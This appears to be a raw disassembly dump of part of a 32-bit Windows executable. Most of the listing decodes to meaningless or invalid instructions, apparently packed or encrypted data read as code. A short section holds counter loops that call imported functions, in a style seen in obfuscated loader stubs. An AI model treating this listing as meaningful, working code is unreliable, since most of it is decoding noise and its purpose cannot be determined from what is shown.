  40a760:	pop    ecx
  40a761:	ins    BYTE PTR es:[edi],dx
  40a762:	shr    BYTE PTR [ebp+eax*8-0x47],0x3f
  40a767:	ror    dh,0x7b
  40a76a:	or     al,0xb1
  40a76c:	dec    edi
  40a76d:	add    dl,BYTE PTR ds:0x685edc18
  40a773:	mov    cl,0x73
  40a775:	(bad)  
  40a776:	lea    esp,[esi+0x72e54ea0]
  40a77c:	push   eax
  40a77d:	or     edx,ebx
  40a77f:	cmp    DWORD PTR [ebx+0x36],ecx
  40a782:	neg    BYTE PTR [ecx-0x816f87c]
  40a788:	mov    esp,0x173ce73e
  40a78d:	ret    
  40a78e:	loope  0x40a807
  40a790:	xchg   ebx,eax
  40a791:	div    DWORD PTR [eax+0x43f5139e]
  40a797:	pop    eax
  40a798:	cli    
  40a799:	mov    DWORD PTR [esi],eax
  40a79b:	fcom   QWORD PTR [ebx+0x5af82c15]
  40a7a1:	fiadd  DWORD PTR [ebx]
  40a7a3:	lahf   
  40a7a4:	ror    DWORD PTR [ebx-0x4b6cea7b],0x5
  40a7ab:	dec    ebp
  40a7ac:	pop    edi
  40a7ad:	(bad)  [ebx]
  40a7af:	rol    DWORD PTR [edi+0x2b4d473],0x8f
  40a7b6:	xchg   ebp,eax
  40a7b7:	std    
  40a7b8:	xor    eax,0x7075adf6
  40a7bd:	leave  
  40a7be:	and    DWORD PTR [edx],esi
  40a7c0:	dec    esp
  40a7c1:	popa   
  40a7c2:	sbb    ebx,edi
  40a7c4:	int    0xa7
  40a7c6:	fidiv  DWORD PTR [edx-0x10]
  40a7c9:	cmp    esp,esi
  40a7cb:	jnp    0x40a7d5
  40a7cd:	sbb    ah,dh
  40a7cf:	inc    edi
  40a7d0:	mov    ax,ds:0x9002edd4
  40a7d6:	xor    BYTE PTR [edx],ch
  40a7d8:	mov    ch,0xc5
  40a7da:	sbb    BYTE PTR [edx-0x6e6da13e],bh
  40a7e0:	push   eax
  40a7e1:	outs   dx,DWORD PTR ds:[esi]
  40a7e2:	mov    bl,dh
  40a7e4:	jmp    0x40313c2
  40a7e9:	repnz sub eax,DWORD PTR [edx]
  40a7ec:	fstp   DWORD PTR [edx+0x23]
  40a7ef:	mov    edi,0x27bd6b5e
  40a7f4:	xor    al,0x85
  40a7f6:	call   0x4bbb50fd
  40a7fb:	aaa    
  40a7fc:	repnz or ecx,edi
  40a7ff:	cs sbb al,al
  40a802:	(bad)  
  40a803:	mov    WORD PTR [esp+eiz*2+0x2e63c6b1],ss
  40a80a:	mov    edi,0x3ee6fbb7
  40a80f:	imul   esi,DWORD PTR [eax+0x53],0xb39e4d14
  40a816:	scas   al,BYTE PTR es:[edi]
  40a817:	rcr    BYTE PTR [edi-0x8],0xac
  40a81b:	aaa    
  40a81c:	out    0xf,eax
  40a81e:	xchg   esp,eax
  40a81f:	call   0x31d7:0xab8ffead
  40a826:	fcomi  st,st(5)
  40a828:	(bad)  
  40a829:	stos   BYTE PTR es:[edi],al
  40a82a:	push   edi
  40a82b:	outs   dx,DWORD PTR ds:[esi]
  40a82c:	pop    edi
  40a82d:	xchg   DWORD PTR [edi-0xa],esp
  40a830:	sbb    eax,0x42aacedd
  40a835:	call   0x3a56:0xf6ba18ed
  40a83c:	aad    0x66
  40a83e:	aam    0x23
  40a840:	cwde   
  40a841:	(bad)  
  40a842:	lahf   
  40a843:	xchg   edx,eax
  40a844:	push   ebx
  40a845:	mov    gs:0xd0742ebd,al
  40a84b:	mov    eax,ds:0xe8458d6c
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x43045d,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430469,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430469
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430469,ebx
  40a87c:	cmp    DWORD PTR ds:0x430469,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430469,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e8fb
  40a89b:	call   DWORD PTR ds:0x42ec3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430465,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4304eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43046d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e7d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e7d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e7d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42ea07
  40a90b:	cmp    DWORD PTR ds:0x42e7d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx+0x558ff479],bl
  40a93e:	mov    al,0x99
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a8f3
  40a948:	loope  0x40a9c0
  40a94a:	cs stc 
  40a94c:	outs   dx,DWORD PTR ds:[esi]
  40a94d:	dec    esp
  40a94e:	aaa    
  40a94f:	mov    bh,0xcf
  40a951:	std    
  40a952:	sti    
  40a953:	mov    ss,WORD PTR [eax+0x0]
  40a956:	jbe    0x40a9c4
  40a958:	dec    ecx
  40a959:	bound  edx,QWORD PTR [edi-0x5e]
  40a95c:	fsub   DWORD PTR [ebx-0x48]
  40a95f:	mov    edx,0x59dc659b
  40a964:	mov    ch,BYTE PTR [esi+0x507b1295]
  40a96a:	ds jns 0x40a9a4
  40a96d:	sbb    cl,BYTE PTR [esi+0x2]
  40a970:	sub    eax,0x589ccdbc
  40a975:	push   edx
  40a976:	sub    DWORD PTR [eax-0x5b08c083],eax
  40a97c:	pop    ebp
  40a97d:	add    al,0x6f
  40a97f:	cmp    cl,BYTE PTR [eax+0x2b]
  40a982:	cwde   
  40a983:	xchg   ecx,eax
  40a984:	stos   BYTE PTR es:[edi],al
  40a985:	dec    ebp
  40a986:	cmp    dl,ch
  40a988:	js     0x40a98c
  40a98a:	dec    ecx
  40a98b:	cdq    
  40a98c:	gs cwde 
  40a98e:	mov    dl,0x3e
  40a990:	add    ah,dh
  40a992:	fst    DWORD PTR [ebp+0x1c]
  40a995:	jmp    0xc358f0a0
  40a99a:	xor    ah,bl
  40a99c:	cmp    ch,BYTE PTR [esi+0x46]
  40a99f:	pop    ss
  40a9a0:	push   ecx
  40a9a1:	add    BYTE PTR [eax],dh
  40a9a3:	das    
  40a9a4:	adc    BYTE PTR [ebp+0x2987b093],dl
  40a9aa:	xchg   edx,eax
  40a9ab:	cmp    BYTE PTR [esi+0x5a4bb0dc],ch
  40a9b1:	xchg   dh,bh
  40a9b3:	xor    BYTE PTR [ebx-0xf],ah
  40a9b6:	pop    esi
  40a9b7:	into   
  40a9b8:	in     al,dx
  40a9b9:	(bad)  
  40a9ba:	in     al,dx
  40a9bb:	pop    ebp
  40a9bc:	int    0x54
  40a9be:	pop    ecx
  40a9bf:	sbb    eax,0xfa26077d
  40a9c4:	imul   esi,DWORD PTR [esp+0x4a],0x35
  40a9c9:	outs   dx,BYTE PTR ds:[esi]
  40a9ca:	mov    ebx,0xfee09932
  40a9cf:	jbe    0x40a9cb
  40a9d1:	imul   edi,DWORD PTR [eax+ecx*4+0x27698ed3],0xffffffa6
  40a9d9:	xchg   edi,eax
  40a9da:	cmp    esi,0x69683471
  40a9e0:	xor    al,0x8d
  40a9e2:	sahf   
  40a9e3:	popa   
  40a9e4:	fld    QWORD PTR [edi+0x39f192b1]
  40a9ea:	pop    esi
  40a9eb:	cvttps2pi mm4,xmm3
  40a9ee:	sub    al,0x47
  40a9f0:	jecxz  0x40a9a3
  40a9f2:	ss stc 
  40a9f4:	in     eax,0x57
  40a9f6:	push   cs
  40a9f7:	retf   0xc9b9
  40a9fa:	mov    eax,ds:0x23cf3d27
  40a9ff:	clc    
  40aa00:	les    edi,FWORD PTR [ecx]
  40aa02:	cmp    BYTE PTR [edx+edx*4],dh
  40aa05:	aad    0x9e
  40aa07:	pop    eax
  40aa08:	mov    al,ds:0xf63bd1ec
  40aa0d:	pop    ebx
  40aa0e:	pop    ss
  40aa0f:	outs   dx,BYTE PTR ds:[esi]
  40aa10:	loopne 0x40a9ef
  40aa12:	pop    es
  40aa13:	pop    ebx
  40aa14:	fs aad 0x7a
  40aa17:	cmp    esi,esi
  40aa19:	addr16 out dx,eax
  40aa1b:	cmc    
  40aa1c:	(bad)  [esi-0x40]
  40aa1f:	pop    ebx
  40aa20:	pop    eax
  40aa21:	and    DWORD PTR [ebp-0x79d6b9be],esp
  40aa27:	sub    al,0xf6
  40aa29:	add    ah,BYTE PTR [eax+ebx*8+0x7f]
  40aa2d:	aam    0x1b
  40aa2f:	arpl   WORD PTR ds:0x72407c45,dx
  40aa35:	pushf  
  40aa36:	push   ecx
  40aa37:	mov    edx,0x793421cf
  40aa3c:	xchg   ebp,eax
  40aa3d:	sbb    esi,edi
  40aa3f:	loope  0x40aa5d
  40aa41:	cli    
  40aa42:	push   ebp
  40aa43:	(bad)  
  40aa44:	idiv   ebx
  40aa46:	jne    0x40aaa1
  40aa48:	hlt    
  40aa49:	add    cl,BYTE PTR [ebx]
  40aa4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4c:	call   0xfe818536
  40aa51:	fcmovnb st,st(4)
  40aa53:	mov    ebp,0x91a11c5d
  40aa58:	js     0x40a9f0
  40aa5a:	(bad)  
  40aa5b:	in     eax,dx
  40aa5c:	retf   
  40aa5d:	cmp    bl,BYTE PTR [edi+0x75546a60]
  40aa63:	xor    BYTE PTR [ecx+0x6539efcd],al
  40aa69:	add    eax,0xd100435d
  40aa6e:	jbe    0x40aa17
  40aa70:	sbb    BYTE PTR ds:0x883af836,bh
  40aa76:	ja     0x40aabe
  40aa78:	xor    ch,0x23
  40aa7b:	mov    ds:0x3944abf4,al
  40aa80:	adc    edx,esi
  40aa82:	lds    eax,FWORD PTR [ecx+0x31]
  40aa85:	stos   DWORD PTR es:[edi],eax
  40aa86:	and    eax,0x19ddb179
  40aa8b:	ror    DWORD PTR [edx+ebp*2+0x629ade9a],0x5c
  40aa93:	xchg   ebx,eax
  40aa94:	inc    ebp
  40aa95:	xchg   esi,eax
  40aa96:	xor    edx,DWORD PTR [eax+0x2c]
  40aa99:	adc    al,0x9c
  40aa9b:	sbb    ecx,DWORD PTR [ebx]
  40aa9d:	jo     0x40aa4a
  40aa9f:	clc    
  40aaa0:	retf   0xcda6
  40aaa3:	test   al,0x4a
  40aaa5:	jecxz  0x40aad6
  40aaa7:	mov    ah,0x39
  40aaa9:	lahf   
  40aaaa:	push   edx
  40aaab:	mul    DWORD PTR [ebx]
  40aaad:	add    al,0x48
  40aaaf:	jmp    0x6adc:0x3c35ad9e
  40aab6:	cld    
  40aab7:	out    dx,eax
  40aab8:	jmp    0x3fc6:0x7724ac8d
  40aabf:	push   eax
  40aac0:	scas   eax,DWORD PTR es:[edi]
  40aac1:	xor    DWORD PTR [edx-0x66],esi
  40aac4:	rol    DWORD PTR [edx],1
  40aac6:	repz inc edx
  40aac8:	sbb    BYTE PTR [ebx+0x4ff370d5],0x33
  40aacf:	mov    eax,ds:0x82855cd2
  40aad4:	ret    
  40aad5:	xchg   edi,eax
  40aad6:	sbb    BYTE PTR [edi],cl
  40aad8:	fwait
  40aad9:	adc    bl,BYTE PTR [ebx+0x4f36f09c]
  40aadf:	jmp    0xd17:0xd43afc14
  40aae6:	adc    dl,BYTE PTR [ebp-0x526e7774]
  40aaec:	pop    edx
  40aaed:	pusha  
  40aaee:	hlt    
  40aaef:	adc    al,0x62
  40aaf1:	dec    esi
  40aaf2:	adc    DWORD PTR [edi-0x7c],edi
  40aaf5:	in     eax,0xfb
  40aaf7:	iret   
  40aaf8:	inc    ebx
  40aaf9:	outs   dx,DWORD PTR ds:[esi]
  40aafa:	or     BYTE PTR [edx-0x34a88ab0],dl
  40ab00:	or     al,0x24
  40ab02:	out    0x65,al
  40ab04:	lods   eax,DWORD PTR ds:[esi]
  40ab05:	fisubr WORD PTR [ebp-0x2010f7c6]
  40ab0b:	cmc    
  40ab0c:	out    0xbb,eax
  40ab0e:	data16 shl BYTE PTR [edi+edx*8+0x39],cl
  40ab13:	mov    ebp,0x3650b3bf
  40ab18:	mov    ecx,0x17379d76
  40ab1d:	xlat   BYTE PTR ds:[ebx]
  40ab1e:	inc    ebp
  40ab1f:	lock and dl,dh
  40ab22:	aam    0x19
  40ab24:	mov    dh,cl
  40ab26:	(bad)  
  40ab27:	xchg   ebx,eax
  40ab28:	jns    0x40aac3
  40ab2a:	loop   0x40ab59
  40ab2c:	sbb    BYTE PTR [edx-0x69958198],ch
  40ab32:	mov    eax,DWORD PTR [edx-0x29f7bd40]
  40ab38:	pop    es
  40ab39:	push   ebp
  40ab3a:	jmp    0xf91b8140
  40ab3f:	dec    esi
  40ab40:	xchg   esi,eax
  40ab41:	or     esp,ebp
  40ab43:	jo     0x40ab41
  40ab45:	mov    ah,0x70
  40ab47:	cmp    esp,ebp
  40ab49:	imul   DWORD PTR ds:0x14706f0
  40ab4f:	jne    0x40ab14
  40ab51:	out    dx,al
  40ab52:	push   ds
  40ab53:	imul   ebx,DWORD PTR [ebx-0x46d8af41],0x5e063a4c
  40ab5d:	div    DWORD PTR [edx]
  40ab5f:	xor    BYTE PTR [edi],dl
  40ab61:	cmp    dh,BYTE PTR [esi+0x3ed479f9]
  40ab67:	dec    edi
  40ab68:	jno    0x40ab1e
  40ab6a:	push   cs
  40ab6b:	das    
  40ab6c:	outs   dx,DWORD PTR ds:[esi]
  40ab6d:	mov    dh,0x9f
  40ab6f:	mov    edx,0x94c6a508
  40ab74:	pop    edx
  40ab75:	and    esp,ebp
  40ab77:	out    0xcf,eax
  40ab79:	retf   
  40ab7a:	push   esi
  40ab7b:	push   es
  40ab7c:	icebp  
  40ab7d:	and    BYTE PTR [eax],ah
  40ab7f:	sub    BYTE PTR [edx+0x21],al
  40ab82:	jmp    0xf4d7:0xdd24c8a3
  40ab89:	or     cl,BYTE PTR [edi]
  40ab8b:	xchg   BYTE PTR [eax-0x71606287],ch
  40ab91:	and    al,0x27
  40ab93:	rcl    eax,1
  40ab95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab96:	(bad)  
  40ab97:	nop
  40ab98:	imul   edi,DWORD PTR [edx],0x65fbbc6e
  40ab9e:	jge    0x40abf5
  40aba0:	lds    edi,FWORD PTR [ebx+0x75c3396]
  40aba6:	and    esp,DWORD PTR [edx]
  40aba8:	jecxz  0x40abf7
  40abaa:	sbb    al,0x29
  40abac:	pop    ebx
  40abad:	data16 js 0x40abee
  40abb0:	mov    dl,0xf2
  40abb2:	outs   dx,DWORD PTR ds:[esi]
  40abb3:	mov    edi,fs
  40abb5:	dec    esi
  40abb6:	sti    
  40abb7:	pop    ss
  40abb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abb9:	dec    eax
  40abba:	xchg   ebp,eax
  40abbb:	das    
  40abbc:	sub    ch,cl
  40abbe:	fs add esp,edx
  40abc1:	and    esi,DWORD PTR [edx-0x25]
  40abc4:	lods   eax,DWORD PTR ds:[esi]
  40abc5:	mov    al,0x85
  40abc7:	mov    esp,0xc3ee24cc
  40abcc:	shl    DWORD PTR [ebx+0x2402ea93],cl
  40abd2:	cli    
  40abd3:	stos   DWORD PTR es:[edi],eax
  40abd4:	imul   edi,esi,0x820fd18c
  40abda:	dec    edi
  40abdb:	sbb    al,0x53
  40abdd:	xor    al,0x41
  40abdf:	les    esp,FWORD PTR [edi-0x3870d2a1]
  40abe5:	ds mov ecx,0x7e829a23
  40abeb:	mov    eax,0x68c4cb81
  40abf0:	fstp   QWORD PTR [esi+eiz*8]
  40abf3:	cs retf 
  40abf5:	push   edi
  40abf6:	nop
  40abf7:	ss adc eax,0xafe8c4e7
  40abfd:	mov    DWORD PTR [edx-0x3d],eax
  40ac00:	fwait
  40ac01:	mov    BYTE PTR [edi-0x76],dl
  40ac04:	stc    
  40ac05:	fist   WORD PTR [edi]
  40ac07:	xchg   BYTE PTR [eax],ah
  40ac09:	sbb    bl,ch
  40ac0b:	ret    
  40ac0c:	or     cl,BYTE PTR [ebp-0x4b130ffe]
  40ac12:	xor    ch,BYTE PTR cs:[edi]
  40ac15:	jl     0x40abe0
  40ac17:	adc    esi,esp
  40ac19:	rcr    ch,1
  40ac1b:	add    al,0x5b
  40ac1d:	into   
  40ac1e:	dec    eax
  40ac1f:	jb     0x40abdd
  40ac21:	popa   
  40ac22:	cmp    BYTE PTR [edi-0x8],dh
  40ac25:	pop    es
  40ac26:	icebp  
  40ac27:	repz sbb eax,0x80c111f4
  40ac2d:	xchg   ebx,eax
  40ac2e:	mov    ?,WORD PTR [edx+0x5b]
  40ac31:	add    edi,0x65
  40ac34:	xor    eax,edx
  40ac36:	rep outs dx,BYTE PTR ds:[esi]
  40ac38:	in     eax,dx
  40ac39:	sub    eax,DWORD PTR [eax+0x27c7a54b]
  40ac3f:	jg     0x40ac79
  40ac41:	xchg   edi,eax
  40ac42:	inc    BYTE PTR [edi+eiz*8-0x604b6f45]
  40ac49:	enter  0x1260,0x8d
  40ac4d:	xchg   edx,eax
  40ac4e:	cmc    
  40ac4f:	sub    cl,BYTE PTR [ecx+edx*8]
  40ac52:	jb     0x40ac6a
  40ac54:	cwde   
  40ac55:	jb     0x40ac02
  40ac57:	push   esp
  40ac58:	call   DWORD PTR [ebp-0x3ace5333]
  40ac5e:	out    0x5a,eax
  40ac60:	jmp    0x40aca2
  40ac62:	ret    0xa0b9
  40ac65:	jl     0x40ac60
  40ac67:	mov    dl,0xba
  40ac69:	jle    0x40ac0d
  40ac6b:	fs test eax,0x71660720
  40ac71:	push   ss
  40ac72:	cmp    ebx,edi
  40ac74:	xor    BYTE PTR [eax+0x227ca1c8],ch
  40ac7a:	inc    ecx
  40ac7b:	add    BYTE PTR [ebx-0x71ed0148],bh
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	mov    edx,DWORD PTR [ebx-0x13b60ae2]
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac7d
  40ac9f:	cli    
  40aca0:	mov    ?,WORD PTR [ebx+0x71]
  40aca3:	ins    DWORD PTR es:[edi],dx
  40aca4:	and    al,0xa1
  40aca6:	add    al,0xe5
  40aca8:	or     DWORD PTR [ebx+0x699882dc],0x4500ee91
  40acb2:	xor    al,0x40
  40acb4:	ins    BYTE PTR es:[edi],dx
  40acb5:	mov    eax,0xb3197e58
  40acba:	les    edx,FWORD PTR [edx-0x36e5e208]
  40acc0:	pop    ds
  40acc1:	mov    ecx,0x1f978d6b
  40acc6:	aam    0xef
  40acc8:	(bad)  
  40acc9:	xchg   edx,eax
  40acca:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40accc:	adc    esi,DWORD PTR [eax]
  40acce:	push   ecx
  40accf:	dec    ecx
  40acd0:	sbb    eax,0x359251b
  40acd5:	jle    0x40ad38
  40acd7:	in     eax,dx
  40acd8:	add    esi,DWORD PTR [ebx]
  40acda:	dec    ebx
  40acdb:	ds inc edx
  40acdd:	mov    ds:0x99d718a2,al
  40ace2:	leave  
  40ace3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ace4:	jle    0x40ad31
  40ace6:	shl    DWORD PTR [ebx],1
  40ace8:	hlt    
  40ace9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acea:	rcr    DWORD PTR [eax-0x35],1
  40aced:	bound  edi,QWORD PTR [edx-0x7f1cb62b]
  40acf3:	lea    ebx,[eax-0x5a]
  40acf6:	aad    0x86
  40acf8:	cwde   
  40acf9:	inc    edi
  40acfa:	push   es
  40acfb:	push   0x24
  40acfd:	xor    eax,eax
  40acff:	push   es
  40ad00:	das    
  40ad01:	push   esi
  40ad02:	pushf  
  40ad03:	sbb    ebp,DWORD PTR [esi-0x1cf8f7f4]
  40ad09:	mov    dl,0xcf
  40ad0b:	and    dl,BYTE PTR [ebp+0x2d]
  40ad0e:	jecxz  0x40ad60
  40ad10:	je     0x40ad7f
  40ad12:	sbb    al,0x41
  40ad14:	mov    ecx,0x32582f2f
  40ad19:	in     eax,0xe3
  40ad1b:	loop   0x40ad21
  40ad1d:	sub    ebx,eax
  40ad1f:	or     ecx,DWORD PTR [ecx-0x19]
  40ad22:	cmp    ebp,DWORD PTR [eax+0x31f4eac7]
  40ad28:	cmp    DWORD PTR es:[edx],eax
  40ad2b:	inc    edi
  40ad2c:	das    
  40ad2d:	(bad)  
  40ad2e:	pusha  
  40ad2f:	out    0xe3,eax
  40ad31:	push   es
  40ad32:	xlat   BYTE PTR ds:[ebx]
  40ad33:	adc    DWORD PTR [ebp+eiz*1-0x9b90cf1],eax
  40ad3a:	popf   
  40ad3b:	or     dh,BYTE PTR [ecx+edi*4-0x31318872]
  40ad42:	enter  0xd2e0,0xcd
  40ad46:	mov    esp,ecx
  40ad48:	push   edi
  40ad49:	stc    
  40ad4a:	inc    esp
  40ad4b:	sub    BYTE PTR [ebp+0x3f],0x12
  40ad4f:	mov    al,0x1a
  40ad51:	dec    eax
  40ad52:	jg     0x40ad3c
  40ad54:	into   
  40ad55:	test   eax,0xdf705577
  40ad5a:	pusha  
  40ad5b:	dec    esp
  40ad5c:	mov    esp,0xb8e8c392
  40ad61:	fnstcw WORD PTR [ebx-0x7b]
  40ad64:	mov    ds:0x171adfbe,ax
  40ad6a:	mov    ch,0xfd
  40ad6c:	ins    BYTE PTR es:[edi],dx
  40ad6d:	mov    al,0xae
  40ad6f:	stos   DWORD PTR es:[edi],eax
  40ad70:	sbb    edx,DWORD PTR [eax-0x322a29bb]
  40ad76:	fstp   TBYTE PTR [edx]
  40ad78:	or     al,0x5c
  40ad7a:	jl     0x40add8
  40ad7c:	xor    BYTE PTR [ecx-0x78],bh
  40ad7f:	lea    edx,[edx]
  40ad81:	into   
  40ad82:	rcl    BYTE PTR [eax+0x4d],0x4f
  40ad86:	inc    eax
  40ad87:	scas   eax,DWORD PTR es:[edi]
  40ad88:	daa    
  40ad89:	mov    ebp,0xc5ed0b4a
  40ad8e:	pusha  
  40ad8f:	jb     0x40ad66
  40ad91:	mov    eax,0xc48fb203
  40ad96:	or     BYTE PTR [eax],ah
  40ad98:	push   0x6c
  40ad9a:	dec    ebp
  40ad9b:	cmp    BYTE PTR [edx+0x56],al
  40ad9e:	mov    esi,0x612172eb
  40ada3:	mov    bh,0xb9
  40ada5:	arpl   WORD PTR [edi],di
  40ada7:	cmp    BYTE PTR [edx+eax*4+0x22],bl
  40adab:	sbb    al,0x8c
  40adad:	cs inc eax
  40adaf:	push   eax
  40adb0:	xchg   ecx,eax
  40adb1:	inc    edx
  40adb2:	mov    ch,0x35
  40adb4:	jl     0x40adda
  40adb6:	push   ss
  40adb7:	shl    DWORD PTR [edi-0x44],cl
  40adba:	(bad)  
  40adbc:	mov    bl,0x6a
  40adbe:	sub    edi,DWORD PTR ds:0x382da6c8
  40adc4:	out    dx,eax
  40adc5:	mov    ebx,0x603c72d7
  40adca:	fsubr  DWORD PTR [ebx+ebp*4-0x4e]
  40adce:	mov    ebx,0x8dd642e
  40add3:	fisubr DWORD PTR [edi]
  40add5:	sub    DWORD PTR [eax+0x28],esp
  40add8:	arpl   WORD PTR [edi-0x46c1654c],si
  40adde:	sbb    bl,BYTE PTR [edi-0xeeb79d]
  40ade4:	mov    ds,WORD PTR [ebx]
  40ade6:	jo     0x40add1
  40ade8:	inc    ecx
  40ade9:	or     edx,DWORD PTR [edx+0x1a]
  40adec:	pop    eax
  40aded:	retf   
  40adee:	jle    0x40adb2
  40adf0:	mov    ch,ch
  40adf2:	inc    edi
  40adf3:	sub    esi,DWORD PTR [eax]
  40adf5:	(bad)  
  40adf6:	push   ds
  40adf7:	or     eax,0x4513bf27
  40adfc:	scas   al,BYTE PTR es:[edi]
  40adfd:	std    
  40adfe:	inc    ebp
  40adff:	inc    eax
  40ae00:	jl     0x40adf8
  40ae02:	jge    0x40ad85
  40ae04:	mov    al,0x98
  40ae06:	pushf  
  40ae07:	std    
  40ae08:	out    0x1c,eax
  40ae0a:	mov    al,0xac
  40ae0c:	in     al,0x7c
  40ae0e:	pop    esi
  40ae0f:	or     DWORD PTR ds:0x7007,ecx
  40ae14:	dec    ebp
  40ae15:	add    BYTE PTR [edi],ah
  40ae17:	mov    edi,0x8c1c883d
  40ae1c:	adc    eax,0x69f0d26a
  40ae21:	push   cs
  40ae22:	lock jno 0x40ade1
  40ae25:	mov    bh,BYTE PTR [edi+0x48]
  40ae28:	(bad)  
  40ae29:	xchg   ebp,eax
  40ae2a:	push   cs
  40ae2b:	xor    dh,bh
  40ae2d:	loop   0x40ae75
  40ae2f:	push   0xffffffda
  40ae31:	popf   
  40ae32:	xchg   esp,eax
  40ae33:	mov    edx,0x6cc7e4be
  40ae38:	inc    ecx
  40ae39:	in     eax,0x3f
  40ae3b:	imul   edx,DWORD PTR [ecx+0x3bf3d4fc],0x6ca9717f
  40ae45:	adc    al,BYTE PTR [edi-0x52]
  40ae48:	loope  0x40adfc
  40ae4a:	(bad)  
  40ae4b:	lds    esp,FWORD PTR [edi]
  40ae4d:	inc    esp
  40ae4e:	repnz cdq 
  40ae50:	repz mov WORD PTR [edi+0x64],gs
  40ae54:	cmp    edx,DWORD PTR [eax-0xe537138]
  40ae5a:	inc    edi
  40ae5b:	mov    ch,0xb6
  40ae5d:	into   
  40ae5e:	inc    eax
  40ae5f:	ror    BYTE PTR [eax-0x6d5a5a2b],1
  40ae65:	(bad)  
  40ae66:	pusha  
  40ae67:	or     cl,BYTE PTR [ebx+0x6c]
  40ae6a:	xor    eax,0x9d3ecfe4
  40ae6f:	not    BYTE PTR [edx+0x779e479f]
  40ae75:	jp     0x40ae1b
  40ae77:	mov    cx,0xeedf
  40ae7b:	mov    dl,bh
  40ae7d:	sub    eax,0xba957d08
  40ae82:	out    dx,eax
  40ae83:	push   ss
  40ae84:	loop   0x40ae4d
  40ae86:	xor    al,0x23
  40ae88:	push   ebx
  40ae89:	(bad)  [eax+edi*4+0x50]
  40ae8d:	push   esi
  40ae8e:	pop    ss
  40ae8f:	sub    DWORD PTR [ebx+0x12278b8d],ecx
  40ae95:	cld    
  40ae96:	outs   dx,BYTE PTR ds:[esi]
  40ae97:	daa    
  40ae98:	xor    edi,DWORD PTR [ebx]
  40ae9a:	out    dx,eax
  40ae9b:	or     dl,BYTE PTR [eax-0x4a]
  40ae9e:	mov    esi,0xf74cd9cf
  40aea3:	xchg   DWORD PTR [esi],ebp
  40aea5:	push   cs
  40aea6:	pop    esp
  40aea7:	clc    
  40aea8:	sti    
  40aea9:	mov    edx,0x5af42de8
  40aeae:	inc    eax
  40aeaf:	mov    ebx,0xdfcb3bfe
  40aeb4:	dec    eax
  40aeb5:	(bad)  [esi-0x5e]
  40aeb8:	ret    0x9716
  40aebb:	add    ch,bh
  40aebd:	adc    al,0x9e
  40aebf:	sar    BYTE PTR [ecx],1
  40aec1:	pop    ds
  40aec2:	(bad)  
  40aec3:	out    0xc,al
  40aec5:	add    ebx,DWORD PTR [ebp+0x57e7c639]
  40aecb:	fimul  WORD PTR [edx-0x41160ce7]
  40aed1:	sbb    al,0x8e
  40aed3:	fdiv   DWORD PTR [ebx+0x717d847f]
  40aed9:	add    BYTE PTR [ebp+ebx*1+0x4f],dl
  40aedd:	imul   esp,DWORD PTR [eax-0x71bc8a49],0x74
  40aee4:	inc    eax
  40aee5:	loopne 0x40af14
  40aee7:	push   esi
  40aee8:	ds mov ecx,0xcf68a7e4
  40aeee:	push   eax
  40aeef:	jns    0x40aed4
  40aef1:	mov    DWORD PTR [esi],ebx
  40aef3:	dec    ebx
  40aef4:	sbb    al,BYTE PTR [ecx+eiz*8-0x7c]
  40aef8:	loopne 0x40af59
  40aefa:	jmp    0xfcf6:0x9e49300b
  40af01:	sar    BYTE PTR [esi-0x4b],0xbf
  40af05:	fcomp  DWORD PTR [ecx+0x67cfa301]
  40af0b:	lock shr DWORD PTR [ebx],cl
  40af0e:	push   ds
  40af0f:	xchg   ebx,eax
  40af10:	mov    ebx,0x62934f51
  40af15:	push   esp
  40af16:	aaa    
  40af17:	add    eax,DWORD PTR [ebx+0x2d7ced24]
  40af1d:	rcr    DWORD PTR [edx+0x29],0x67
  40af21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af22:	mov    ds:0x24a7e0c0,eax
  40af27:	stos   DWORD PTR es:[edi],eax
  40af28:	or     eax,0x3b8cf268
  40af2d:	push   esi
